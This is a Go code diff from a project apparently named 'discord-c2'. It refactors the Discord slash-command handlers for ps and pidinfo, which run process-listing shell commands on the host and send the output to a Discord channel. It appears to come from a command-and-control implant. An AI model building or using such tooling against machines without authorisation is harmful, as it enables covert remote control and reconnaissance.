@@ -1,4 +1,4 @@
-package main
+package commands
 
 // This file contains system-information slash commands such as ps and
 // pidinfo, which are implemented using platform-specific shell commands.
@@ -7,11 +7,13 @@ import (
 	"fmt"
 	"runtime"
 
+	"discord-c2/internal/shell"
+
 	"github.com/bwmarrin/discordgo"
 )
 
 // handleSlashPs lists processes using ps on Unix-like systems or tasklist on
-// Windows, returning the output via runCommandString.
+// Windows, returning the output via shell.Run.
 func handleSlashPs(s *discordgo.Session, i *discordgo.InteractionCreate) {
 	cmdStr := "ps aux"
 	if runtime.GOOS == "windows" {
@@ -24,7 +26,7 @@ func handleSlashPs(s *discordgo.Session, i *discordgo.InteractionCreate) {
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	runCommandString(s, i.ChannelID, nil, cmdStr)
+	shell.Run(s, i.ChannelID, nil, cmdStr)
 }
 
 // handleSlashPidInfo shows details about a single process ID using platform
@@ -60,5 +62,5 @@ func handleSlashPidInfo(s *discordgo.Session, i *discordgo.InteractionCreate, da
 			Flags:   discordgo.MessageFlagsEphemeral,
 		},
 	})
-	runCommandString(s, i.ChannelID, nil, cmdStr)
+	shell.Run(s, i.ChannelID, nil, cmdStr)
 }
